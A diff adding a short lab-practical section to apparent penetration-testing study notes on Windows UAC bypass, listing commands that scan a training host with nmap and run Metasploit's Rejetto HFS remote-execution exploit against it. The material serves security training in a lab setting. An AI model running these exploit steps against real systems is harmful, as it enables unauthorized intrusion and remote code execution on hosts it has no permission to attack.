@@ -160,3 +160,10 @@ Prompts: Non-privileged users receive a credential prompt (must enter administra
 Security Risk: Some attacks can bypass UAC, allowing malicious executables to run with elevated privileges without proper authorization.
 
 ### Bypassing UAC with UACMe Practical
+
+- `nmap demo.ine.local` --> Port 80/Http is open
+- `service postgresql start && msfconsole`
+- `setg RHOSTS 10.2.22.223`
+- `search rejetto`
+- `use exploit/windows/http/rejetto_hfs_exec`
+- `exploit`
